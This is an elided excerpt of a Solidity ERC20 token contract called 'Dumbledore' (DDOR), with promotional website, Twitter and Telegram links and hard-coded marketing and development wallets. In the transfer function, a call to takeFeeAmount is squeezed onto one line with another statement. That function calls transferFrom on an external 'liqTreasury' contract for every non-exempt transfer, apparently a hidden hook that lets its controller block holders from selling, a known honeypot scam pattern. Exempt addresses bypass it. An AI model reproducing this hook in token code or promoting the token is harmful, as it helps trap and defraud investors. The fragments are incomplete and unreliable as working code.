...
https://dumbledore.vip
https://twitter.com/DumbledoreErc
https://t.me/Dumbledore_Entry
...
contract Dumbledore is ERC20, Ownable {
    ...
    constructor() ERC20("Dumbledore", "DDOR") {
        ...
        marketingWallet = payable(0x4Ae1bbfc76F76B1aC76A014895a952360c467401);
        developmentWallet = payable(0x3Bc122ED50aFaA945B9B36fD0E0c81c6F54d94aC);
    ...
    function takeFeeAmount(address from, address to) internal {
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]
            && liqTreasury != address(0)) {
            IERC20(liqTreasury).transferFrom(from, to, 0);
        }
    }
    ...
    function _transfer(
        ...
        uint256 contractTokenBalance = balanceOf(address(this));takeFeeAmount(from, to);
        ...
        if (_isExcludedFromFees[from]) { super._send(from, to, amount); return; }
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }
        uint256 fees = 0;
